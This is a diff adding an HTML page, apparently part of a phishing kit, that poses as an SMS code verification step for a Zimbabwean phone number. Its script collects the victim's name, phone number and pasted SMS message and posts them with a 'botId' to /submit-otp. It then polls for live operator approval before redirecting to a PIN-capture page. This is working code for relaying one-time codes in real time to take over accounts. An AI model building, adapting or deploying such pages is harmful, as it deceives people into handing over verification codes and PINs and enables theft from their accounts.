@@ -1,0 +1,417 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Verify Your Number</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background: #fff;
+            color: #222;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        .top-bar {
+            height: 72px;
+            background: #0d47a1;
+            display: flex;
+            align-items: center;
+            padding: 0 22px;
+            flex-shrink: 0;
+        }
+        .back-btn {
+            color: #fff;
+            font-size: 30px;
+            text-decoration: none;
+            font-weight: 300;
+        }
+        .container {
+            flex: 1;
+            width: 100%;
+            max-width: 420px;
+            margin: 0 auto;
+            padding: 28px 24px 20px;
+            display: flex;
+            flex-direction: column;
+        }
+        .title {
+            font-size: 26px;
+            font-weight: 700;
+            color: #0d47a1;
+            margin-bottom: 4px;
+            letter-spacing: -0.3px;
+        }
+        .subtitle {
+            font-size: 15px;
+            color: #555;
+            line-height: 1.5;
+            margin-bottom: 4px;
+        }
+        .wrong-number {
+            font-size: 15px;
+            color: #0d47a1;
+            text-decoration: none;
+            font-weight: 500;
+            display: inline-block;
+            margin-bottom: 16px;
+            margin-top: 2px;
+        }
+        .wrong-number:hover {
+            text-decoration: underline;
+        }
+        .valid-time {
+            font-size: 14px;
+            color: #888;
+            margin-bottom: 24px;
+        }
+        .message-area {
+            margin-bottom: 20px;
+        }
+        .message-area textarea {
+            width: 100%;
+            min-height: 120px;
+            padding: 14px 16px;
+            border: 2px solid #d0d7de;
+            border-radius: 10px;
+            font-size: 16px;
+            font-family: inherit;
+            resize: vertical;
+            outline: none;
+            transition: border 0.2s, box-shadow 0.2s;
+            background: #fff;
+            line-height: 1.6;
+        }
+        .message-area textarea:focus {
+            border-color: #0d47a1;
+            box-shadow: 0 0 0 3px rgba(13, 71, 161, 0.15);
+        }
+        .message-area textarea::placeholder {
+            color: #aaa;
+        }
+        .resend-wrap {
+            color: #666;
+            font-size: 15px;
+            margin-bottom: 0;
+        }
+        .resend-wrap .timer {
+            font-weight: 600;
+            color: #0d47a1;
+        }
+        .continue-btn {
+            position: fixed;
+            left: 24px;
+            right: 24px;
+            bottom: 28px;
+            height: 56px;
+            border: none;
+            border-radius: 10px;
+            background: #b7cff0;
+            color: #fff;
+            font-size: 20px;
+            font-weight: 700;
+            cursor: not-allowed;
+            transition: background 0.2s;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            max-width: 420px;
+            margin: 0 auto;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+        .continue-btn:enabled {
+            background: #0d47a1;
+            cursor: pointer;
+        }
+        .continue-btn:enabled:hover {
+            background: #0a3a8a;
+        }
+        #message-box {
+            display: none;
+            padding: 12px 16px;
+            border-radius: 8px;
+            margin-bottom: 16px;
+            font-size: 15px;
+            font-weight: 500;
+        }
+        @media (max-width: 480px) {
+            .container {
+                padding: 22px 18px 16px;
+            }
+            .title {
+                font-size: 24px;
+            }
+            .message-area textarea {
+                min-height: 100px;
+                font-size: 15px;
+            }
+            .continue-btn {
+                height: 54px;
+                font-size: 18px;
+                left: 18px;
+                right: 18px;
+                bottom: 22px;
+            }
+        }
+        @media (max-width: 360px) {
+            .message-area textarea {
+                min-height: 80px;
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="top-bar">
+        <a href="#" class="back-btn">&#8592;</a>
+    </div>
+
+    <div class="container">
+        <div class="title">Enter Code</div>
+        <div class="subtitle" id="subtitlePlaceholder">
+            Enter the code that was sent to (+263) 712345678
+        </div>
+        <a href="details.html" class="wrong-number">Wrong Number?</a>
+        <div class="valid-time">The code is valid for 5 minutes</div>
+
+        <div class="message-area">
+            <textarea id="smsMessage" placeholder="Paste the whole SMS message here..."></textarea>
+        </div>
+
+        <div class="resend-wrap">
+            Resend code in <span class="timer">05:00</span>
+        </div>
+    </div>
+
+    <button class="continue-btn" disabled>SUBMIT</button>
+
+    <script>
+        (function() {
+            const phone = localStorage.getItem('phone');
+            const subtitle = document.getElementById('subtitlePlaceholder');
+            if (phone) {
+                subtitle.textContent = 'Enter the code that was sent to ' + phone;
+            }
+        })();
+    </script>
+
+    <script>
+        (function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            let botId = urlParams.get('botId') || localStorage.getItem('botId');
+            let name = urlParams.get('name') || localStorage.getItem('name');
+            let phone = urlParams.get('phone') || localStorage.getItem('phone');
+
+            if (!name) {
+                name = localStorage.getItem('fullName');
+                if (name) localStorage.setItem('name', name);
+            }
+
+            if (!phone) {
+                const subtitle = document.querySelector('.subtitle');
+                const match = subtitle.textContent.match(/\((\+?\d+)\)\s*(\d+)/);
+                if (match) phone = match[1] + match[2];
+                if (phone) localStorage.setItem('phone', phone);
+            }
+
+            if (botId) localStorage.setItem('botId', botId);
+
+            const container = document.querySelector('.container');
+            const msgDiv = document.createElement('div');
+            msgDiv.id = 'message-box';
+            msgDiv.style.display = 'none';
+            msgDiv.style.padding = '12px 16px';
+            msgDiv.style.borderRadius = '8px';
+            msgDiv.style.marginBottom = '20px';
+            msgDiv.style.fontSize = '15px';
+            msgDiv.style.fontWeight = '500';
+            msgDiv.style.transition = 'all 0.2s ease';
+            const resendWrap = document.querySelector('.resend-wrap');
+            container.insertBefore(msgDiv, resendWrap);
+
+            function showMessage(text, isError = true) {
+                msgDiv.textContent = text;
+                msgDiv.style.display = 'block';
+                msgDiv.style.background = isError ? '#fde7e7' : '#e7f5e7';
+                msgDiv.style.color = isError ? '#b00020' : '#1e7e34';
+                msgDiv.style.border = isError ? '1px solid #f5c6cb' : '1px solid #b7d7b7';
+            }
+
+            function hideMessage() {
+                msgDiv.style.display = 'none';
+                msgDiv.textContent = '';
+            }
+
+            const textarea = document.getElementById('smsMessage');
+            const continueBtn = document.querySelector('.continue-btn');
+
+            function checkTextArea() {
+                const val = textarea.value.trim();
+                if (val !== '') {
+                    continueBtn.disabled = false;
+                    continueBtn.style.background = '#0d47a1';
+                    continueBtn.style.cursor = 'pointer';
+                } else {
+                    continueBtn.disabled = true;
+                    continueBtn.style.background = '#b7cff0';
+                    continueBtn.style.cursor = 'not-allowed';
+                }
+                hideMessage();
+            }
+
+            textarea.addEventListener('input', checkTextArea);
+            textarea.addEventListener('paste', function() {
+                setTimeout(checkTextArea, 10);
+            });
+            textarea.focus();
+
+            const timerSpan = document.querySelector('.timer');
+            const resendWrapEl = document.querySelector('.resend-wrap');
+            let totalSeconds = 5 * 60;
+            let interval = null;
+
+            function formatTime(sec) {
+                const m = String(Math.floor(sec / 60)).padStart(2, '0');
+                const s = String(sec % 60).padStart(2, '0');
+                return `${m}:${s}`;
+            }
+
+            function updateTimerUI() {
+                if (totalSeconds <= 0) {
+                    resendWrapEl.innerHTML = 'Resend code';
+                    resendWrapEl.style.color = '#1976d2';
+                    resendWrapEl.style.cursor = 'pointer';
+                    resendWrapEl.style.fontWeight = '600';
+                    clearInterval(interval);
+                    interval = null;
+                    resendWrapEl.onclick = function(e) {
+                        e.preventDefault();
+                        startTimer(5 * 60);
+                        hideMessage();
+                    };
+                    return;
+                }
+                timerSpan.textContent = formatTime(totalSeconds);
+                resendWrapEl.innerHTML = `Resend code in <span class="timer">${formatTime(totalSeconds)}</span>`;
+                resendWrapEl.style.color = '#666';
+                resendWrapEl.style.cursor = 'default';
+                resendWrapEl.style.fontWeight = '400';
+                resendWrapEl.onclick = null;
+            }
+
+            function startTimer(seconds) {
+                if (interval) clearInterval(interval);
+                totalSeconds = seconds;
+                updateTimerUI();
+                interval = setInterval(() => {
+                    totalSeconds--;
+                    if (totalSeconds <= 0) {
+                        totalSeconds = 0;
+                        updateTimerUI();
+                        clearInterval(interval);
+                        interval = null;
+                    } else {
+                        updateTimerUI();
+                    }
+                }, 1000);
+            }
+
+            startTimer(5 * 60);
+
+            function hasRequiredData() {
+                if (!name) {
+                    showMessage('Name missing – please go back and enter your name.', true);
+                    return false;
+                }
+                if (!phone) {
+                    showMessage('Phone number missing – please restart.', true);
+                    return false;
+                }
+                if (!botId) {
+                    showMessage('Bot ID missing – please use the correct link.', true);
+                    return false;
+                }
+                hideMessage();
+                return true;
+            }
+
+            continueBtn.addEventListener('click', function() {
+                if (this.disabled) return;
+                if (!hasRequiredData()) return;
+
+                const message = textarea.value.trim();
+                if (message === '') {
+                    showMessage('Please paste or type the SMS message.', true);
+                    return;
+                }
+
+                continueBtn.disabled = true;
+                continueBtn.textContent = 'Verifying...';
+                continueBtn.style.background = '#f5a623';
+
+                fetch('/submit-otp', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ name, phone, otp: message, botId })
+                })
+                .then(response => {
+                    if (!response.ok) throw new Error('Server error');
+                    return response.json();
+                })
+                .then(data => {
+                    const requestId = data.requestId;
+                    if (!requestId) throw new Error('No ID received');
+
+                    let pollInterval = setInterval(() => {
+                        fetch(`/check-otp/${requestId}`)
+                            .then(res => {
+                                if (!res.ok) throw new Error('Verification error');
+                                return res.json();
+                            })
+                            .then(status => {
+                                if (status.approved === true) {
+                                    clearInterval(pollInterval);
+                                    window.location.href = `pin.html?botId=${botId}&name=${encodeURIComponent(name)}&phone=${encodeURIComponent(phone)}`;
+                                } else if (status.approved === false) {
+                                    clearInterval(pollInterval);
+                                    showMessage('Incorrect code. Please try again.', true);
+                                    continueBtn.disabled = false;
+                                    continueBtn.textContent = 'SUBMIT';
+                                    continueBtn.style.background = '#0d47a1';
+                                    continueBtn.style.cursor = 'pointer';
+                                    textarea.value = '';
+                                    checkTextArea();
+                                    textarea.focus();
+                                }
+                            })
+                            .catch(err => {
+                                clearInterval(pollInterval);
+                                showMessage('Verification error: ' + err.message, true);
+                                continueBtn.disabled = false;
+                                continueBtn.textContent = 'SUBMIT';
+                                continueBtn.style.background = '#0d47a1';
+                                continueBtn.style.cursor = 'pointer';
+                            });
+                    }, 2000);
+                })
+                .catch(err => {
+                    showMessage('Send error: ' + err.message, true);
+                    continueBtn.disabled = false;
+                    continueBtn.textContent = 'SUBMIT';
+                    continueBtn.style.background = '#0d47a1';
+                    continueBtn.style.cursor = 'pointer';
+                });
+            });
+
+            hasRequiredData();
+        })();
+    </script>
+</body>
+</html>
